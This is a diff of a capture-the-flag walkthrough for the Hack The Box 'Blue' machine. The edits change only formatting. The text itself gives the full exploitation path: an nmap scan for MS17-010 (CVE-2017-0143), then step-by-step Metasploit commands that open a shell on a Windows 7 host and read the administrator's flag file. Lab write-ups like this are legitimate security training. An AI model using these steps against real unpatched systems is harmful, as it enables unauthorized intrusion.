@@ -6,10 +6,10 @@
 Take control over the windows computer and find user- en root:flags:.
 Therefore find exploit ms17-010 and run it.
 
-** :scroll: TL:DR :scroll:
-Get **Privilege Escalation** on a **windows 7 Porfessional 7601 Service Pack 1 computer**.
+** :scroll: TL:DR
+Get *Privilege Escalation* on a /*windows 7 Porfessional 7601 Service Pack 1 computer*/.
 
-* :rocket: Getting started :rocket:
+* :rocket: Getting started
 We spawn the machine by clicking the button 
 
 [[../img/blue_ip.png]]
@@ -36,7 +36,10 @@ If we scan the port on vulernabilities:
 nmap --script smb-vuln-ms17-010 -p445 blue.htb
 
 #+end_src
-../img/blue_nmap_ms17-010.png)
+
+#+caption: vulnerability CVE-2017-0143
+[[../img/blue_nmap_ms17-010.png]]
+
 it revails a vulnerability called ms17-010 in Microsoft SMBv1 accorring to [[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143][CVE-2017-0143]].
 
 * Expliotation
@@ -44,7 +47,7 @@ With ~msfconsole~ we can search for an exploit:
 
 1. type ~msfconsole~ to start metasploit;
 2. ~search ms17-010~;
-3. use 0;
+3. ~use 0~;
 4. show options gives the options for configuration;
 5. ~set RHOSTS Blue.htb~
 6. ~set LHOSTS 10.10....~
@@ -52,7 +55,7 @@ With ~msfconsole~ we can search for an exploit:
 8. ~shell~
 9. ~whoami~
 10. ~cd \Users\Administrator\Desktop~
-11. ~type root.txt~
+11. type ~root.txt~
 
 * :mortar_board: Lessons learned :mortar_board:
 1. How to use ~msfconsole~;
